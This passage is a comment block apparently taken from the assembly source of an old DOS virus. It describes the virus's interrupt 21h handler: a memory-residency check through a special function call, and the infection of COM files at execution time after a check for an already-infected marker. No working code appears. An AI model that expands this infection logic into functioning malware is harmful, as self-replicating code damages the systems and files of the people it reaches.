;Vir_21   Handler for DOS int 21h Interrupt
;This handler is the main body of the virus.Infact it provides to many
;life functions ,like memory checks.
;
;This handler has two main functions:
;
; 1] Check for memory management
; When a program attempt a AX=f201h/Int21h it return with a 01F2h into ax.
; This function is used to check the virus presence in memory (see before)
;
; 2] When a program is executed ,the handler infect the files .
; When user attempt a ax=4b00h/Int21h this handler provide to infect the
; program to be executed.First of all,it check for the COM files,then it
; see for the "Already Infected Flag".If the checks are negative ,it
; infect COM files in a very FAST way.See clock!!!
